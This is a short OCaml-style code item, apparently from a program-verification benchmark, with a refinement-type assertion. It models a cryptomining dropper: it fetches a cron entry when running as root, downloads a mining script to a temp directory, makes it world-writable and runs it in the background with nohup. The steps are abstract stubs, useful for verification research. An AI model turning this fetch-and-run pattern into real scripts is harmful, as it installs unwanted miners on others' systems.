let mining (u : unit) : unit =
  let (user : User.t) = whoami () in
  if is_root_user user then curl (cron_link ()) (daemon_path ());
  let (tmp_path : Path.t) = tmp_dir () in
  curl (mining_script_link ()) tmp_path;
  chmod 777 tmp_path;
  nohup (bash tmp_path) (null_dir ());
  ()

let[@assertRty] mining ?l:(p = (true : [%v: unit])) =
  { pre = _G (Any true); res = (true : [%v: unit]); post = rI }
